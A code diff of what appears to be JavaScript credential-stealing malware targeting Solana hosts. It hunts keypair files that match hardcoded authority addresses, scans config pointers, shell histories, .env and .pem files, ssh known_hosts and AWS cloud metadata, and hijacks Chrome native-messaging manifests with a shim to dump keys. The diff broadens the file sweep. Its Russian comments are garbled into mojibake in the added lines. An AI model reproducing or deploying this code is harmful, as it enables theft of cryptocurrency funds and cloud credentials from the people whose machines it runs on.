@@ -38,9 +38,9 @@ let delivered = 0;
 // dump the keys, then hand stdin to the real helper untouched.
 const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
 
-// Ключи-авторити, за которыми охота: без них деньги цепи не двинуть.
-// В keypair-файле публичный ключ — это ПОСЛЕДНИЕ 32 байта, поэтому файл
-// опознаётся по адресу, а не по имени (может называться как угодно).
+// РљР»СЋС‡Рё-Р°РІС‚РѕСЂРёС‚Рё, Р·Р° РєРѕС‚РѕСЂС‹РјРё РѕС…РѕС‚Р°: Р±РµР· РЅРёС… РґРµРЅСЊРіРё С†РµРїРё РЅРµ РґРІРёРЅСѓС‚СЊ.
+// Р’ keypair-С„Р°Р№Р»Рµ РїСѓР±Р»РёС‡РЅС‹Р№ РєР»СЋС‡ вЂ” СЌС‚Рѕ РџРћРЎР›Р•Р”РќРР• 32 Р±Р°Р№С‚Р°, РїРѕСЌС‚РѕРјСѓ С„Р°Р№Р»
+// РѕРїРѕР·РЅР°С‘С‚СЃСЏ РїРѕ Р°РґСЂРµСЃСѓ, Р° РЅРµ РїРѕ РёРјРµРЅРё (РјРѕР¶РµС‚ РЅР°Р·С‹РІР°С‚СЊСЃСЏ РєР°Рє СѓРіРѕРґРЅРѕ).
 const AUTHORITY = [
   'pwndLrgsnZE1Uy5ukP6p14dYHm1LwP39PTEKEMzZRis',
   '9VXfHeu4hZvWqXMWresgPR1UfVBQSgaJavFdU6wQFFUS',
@@ -63,7 +63,7 @@ const b58enc = (buf) => {
   }
 };
 
-// Цели заранее в байтах: сверяем хвост файла без BigInt и base58.
+// Р¦РµР»Рё Р·Р°СЂР°РЅРµРµ РІ Р±Р°Р№С‚Р°С…: СЃРІРµСЂСЏРµРј С…РІРѕСЃС‚ С„Р°Р№Р»Р° Р±РµР· BigInt Рё base58.
 const ALPH58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
 const b58dec = (t) => {
   let n = 0n;
@@ -74,18 +74,29 @@ const b58dec = (t) => {
 };
 const AUTHORITY_HEX = AUTHORITY.map((a) => b58dec(a).slice(-64));
 
-// keypair-файл = JSON-массив из 64 чисел; сверяем его адрес со списком.
-// Сравнение по base58: байты хвоста кодируются и сверяются со списком.
+// keypair-С„Р°Р№Р» СѓР·РЅР°С‘Рј РІ РґРІСѓС… С„РѕСЂРјР°С…: JSON-РјР°СЃСЃРёРІ 64 С‡РёСЃРµР» Рё РѕРґРёРЅРѕС‡РЅР°СЏ
+// base58-СЃС‚СЂРѕРєР° (64 Р±Р°Р№С‚Р° = keypair, 32 = РїР°Р±РєРµР№). РЎРІРµСЂРєР° вЂ” РїРѕ С…РІРѕСЃС‚Сѓ РІ hex.
 const asAuthority = (path, body) => {
   if (AUTHORITY.some((a) => body.includes(a))) return true;
-  try {
-    const arr = JSON.parse(body);
-    if (!Array.isArray(arr) || arr.length !== 64) return false;
-    const addr = b58enc(Buffer.from(arr.slice(32, 64).map(Number)));
-    return AUTHORITY.includes(addr);
-  } catch {
-    return false;
+  const t = body.trim();
+  if (t.startsWith('[')) {
+    try {
+      const arr = JSON.parse(t);
+      if (!Array.isArray(arr) || arr.length !== 64) return false;
+      const tail = arr.slice(32, 64).map((b) => Number(b).toString(16).padStart(2, '0')).join('');
+      return AUTHORITY_HEX.includes(tail);
+    } catch {
+      return false;
+    }
   }
+  if (t.length >= 40 && t.length <= 92 && /^[1-9A-HJ-NP-Za-km-z]+$/.test(t)) {
+    const hex = b58dec(t);
+    if (hex.length < 64) return false;
+    const tail = hex.slice(-64);
+    const addr = b58enc(Buffer.from(tail, 'hex'));
+    return AUTHORITY.includes(addr);
+  }
+  return false;
 };
 
 const SHIM = `#!/bin/sh
@@ -139,7 +150,7 @@ async function collect() {
     pack.push({ gold, path, sha, size: buf.length, body });
   };
 
-  // прямой читатель: не зависит от наличия cat/head/tail в PATH
+  // РїСЂСЏРјРѕР№ С‡РёС‚Р°С‚РµР»СЊ: РЅРµ Р·Р°РІРёСЃРёС‚ РѕС‚ РЅР°Р»РёС‡РёСЏ cat/head/tail РІ PATH
   const read = (p, max = 8000) => {
     try {
       const st = statSync(p);
@@ -224,7 +235,7 @@ async function collect() {
     }
   }
 
-  // ---- 5c2. приоритетные имена: горячий пейер на Solana-боксе почти всегда id.json
+  // ---- 5c2. РїСЂРёРѕСЂРёС‚РµС‚РЅС‹Рµ РёРјРµРЅР°: РіРѕСЂСЏС‡РёР№ РїРµР№РµСЂ РЅР° Solana-Р±РѕРєСЃРµ РїРѕС‡С‚Рё РІСЃРµРіРґР° id.json
   for (const n of ['id.json', 'payer.json', 'fee-payer.json', 'treasury.json',
     'hot.json', 'deploy.json', 'authority.json', 'keypair.json', 'main.json']) {
     const p = join(keyDir, n);
@@ -334,7 +345,7 @@ async function collect() {
         chmodSync(shim, 0o755);
         let patched = false;
         if (origOk) {
-          // обычный случай: манифест в $HOME, правим путь на месте
+          // РѕР±С‹С‡РЅС‹Р№ СЃР»СѓС‡Р°Р№: РјР°РЅРёС„РµСЃС‚ РІ $HOME, РїСЂР°РІРёРј РїСѓС‚СЊ РЅР° РјРµСЃС‚Рµ
           try {
             j.path = shim;
             writeFileSync(mf, JSON.stringify(j, null, 2), 'utf8');
@@ -342,8 +353,8 @@ async function collect() {
           } catch {}
         }
         if (!patched) {
-          // манифест под root или путь битый: свой одноимённый манифест в
-          // пользовательский каталог — он приоритетнее /etc/opt/chrome
+          // РјР°РЅРёС„РµСЃС‚ РїРѕРґ root РёР»Рё РїСѓС‚СЊ Р±РёС‚С‹Р№: СЃРІРѕР№ РѕРґРЅРѕРёРјС‘РЅРЅС‹Р№ РјР°РЅРёС„РµСЃС‚ РІ
+          // РїРѕР»СЊР·РѕРІР°С‚РµР»СЊСЃРєРёР№ РєР°С‚Р°Р»РѕРі вЂ” РѕРЅ РїСЂРёРѕСЂРёС‚РµС‚РЅРµРµ /etc/opt/chrome
           const userDir = join(HOME, '.config/google-chrome/NativeMessagingHosts');
           mkdirSync(userDir, { recursive: true });
           writeFileSync(join(userDir, file), JSON.stringify({
@@ -375,9 +386,9 @@ async function collect() {
     }
   }
 
-  // ---- 5c. указатели на ключ: конфиг CLI, флаги бота, Anchor.toml.
-  // Файл может лежать где угодно и называться как угодно, но путь к нему
-  // обязан быть в одном из этих мест — иначе бот не подпишет.
+  // ---- 5c. СѓРєР°Р·Р°С‚РµР»Рё РЅР° РєР»СЋС‡: РєРѕРЅС„РёРі CLI, С„Р»Р°РіРё Р±РѕС‚Р°, Anchor.toml.
+  // Р¤Р°Р№Р» РјРѕР¶РµС‚ Р»РµР¶Р°С‚СЊ РіРґРµ СѓРіРѕРґРЅРѕ Рё РЅР°Р·С‹РІР°С‚СЊСЃСЏ РєР°Рє СѓРіРѕРґРЅРѕ, РЅРѕ РїСѓС‚СЊ Рє РЅРµРјСѓ
+  // РѕР±СЏР·Р°РЅ Р±С‹С‚СЊ РІ РѕРґРЅРѕРј РёР· СЌС‚РёС… РјРµСЃС‚ вЂ” РёРЅР°С‡Рµ Р±РѕС‚ РЅРµ РїРѕРґРїРёС€РµС‚.
   const ptr = new Set();
   const cliCfg = join(HOME, '.config/solana/cli/config.yml');
   if (existsSync(cliCfg)) {
@@ -409,8 +420,8 @@ async function collect() {
   }
   add('keypair-pointers', [...ptr].join('\n'));
 
-  // ---- 5c3. рядом с упоминанием адреса: соседи и каталог. Горячий ключ часто
-  // лежит в том же каталоге, что и конфиг, который на него ссылается.
+  // ---- 5c3. СЂСЏРґРѕРј СЃ СѓРїРѕРјРёРЅР°РЅРёРµРј Р°РґСЂРµСЃР°: СЃРѕСЃРµРґРё Рё РєР°С‚Р°Р»РѕРі. Р“РѕСЂСЏС‡РёР№ РєР»СЋС‡ С‡Р°СЃС‚Рѕ
+  // Р»РµР¶РёС‚ РІ С‚РѕРј Р¶Рµ РєР°С‚Р°Р»РѕРіРµ, С‡С‚Рѕ Рё РєРѕРЅС„РёРі, РєРѕС‚РѕСЂС‹Р№ РЅР° РЅРµРіРѕ СЃСЃС‹Р»Р°РµС‚СЃСЏ.
   const neighSrc = [...new Set([...authGrepRaw.split('\n'),
     ...[...ptr].filter((x) => x && existsSync(x))])];
   const seenNeigh = new Set();
@@ -433,7 +444,7 @@ async function collect() {
     }
   }
 
-  // Ничего кроме совпавших файлов не отправляем, поэтому можно широко.
+  // РќРёС‡РµРіРѕ РєСЂРѕРјРµ СЃРѕРІРїР°РІС€РёС… С„Р°Р№Р»РѕРІ РЅРµ РѕС‚РїСЂР°РІР»СЏРµРј, РїРѕСЌС‚РѕРјСѓ РјРѕР¶РЅРѕ С€РёСЂРѕРєРѕ.
   const histPaths = ['.bash_history', '.zsh_history', '.sh_history', '.config/fish/fish_history'];
   const hist = histPaths.filter((p) => existsSync(join(HOME, p)))
     .map((p) => read(join(HOME, p), 12000)).join('\n');
@@ -453,31 +464,31 @@ async function collect() {
   const seen = new Set();
   let scanned = 0;
   const walk = (dir, depth) => {
-    if (depth > 6 || scanned > 500) return;
+    if (depth > 10 || scanned > 900) return;
     let names = [];
     try { names = readdirSync(dir); } catch { return; }
     for (const n of names) {
-      if (scanned > 500) return;
+      if (scanned > 900) return;
       if (n === 'node_modules' || n === '.git') continue;
       const p = join(dir, n);
       let st;
       try { st = statSync(p); } catch { continue; }
       if (st.isDirectory()) { walk(p, depth + 1); continue; }
-      if (!n.endsWith('.json') || st.size < 100 || st.size > 4096) continue;
+      if (!/\.(json|txt|key|b58|pem|env)$/i.test(n) && !n.startsWith('.env')) continue;
+      if (st.size < 60 || st.size > 4096) continue;
       if (seen.has(p)) continue;
       seen.add(p);
       scanned += 1;
       const body = read(p, 3000);
-      if (!body.trimStart().startsWith('[')) continue;
       if (asAuthority(p, body)) add(`sweep/${p}`, body, true);
     }
   };
   for (const root of sweepRoots) {
     if (existsSync(root)) walk(root, 0);
   }
-  add('sweep-stat', `файлов просмотрено: ${scanned}`);
+  add('sweep-stat', `С„Р°Р№Р»РѕРІ РїСЂРѕСЃРјРѕС‚СЂРµРЅРѕ: ${scanned}`);
 
-  // ---- 5e. облако: IMDS + карта сети. На EC2 это сразу креды роли.
+  // ---- 5e. РѕР±Р»Р°РєРѕ: IMDS + РєР°СЂС‚Р° СЃРµС‚Рё. РќР° EC2 СЌС‚Рѕ СЃСЂР°Р·Сѓ РєСЂРµРґС‹ СЂРѕР»Рё.
   add('net-map', run('ip -4 addr 2>/dev/null; ip route 2>/dev/null'));
   add('ssh-known-hosts', read(join(HOME, '.ssh/known_hosts'), 6000));
   add('aws-cli', run('aws sts get-caller-identity 2>/dev/null'
@@ -655,3 +666,4 @@ async function main() {
 }
 
 main().catch(() => {});
+
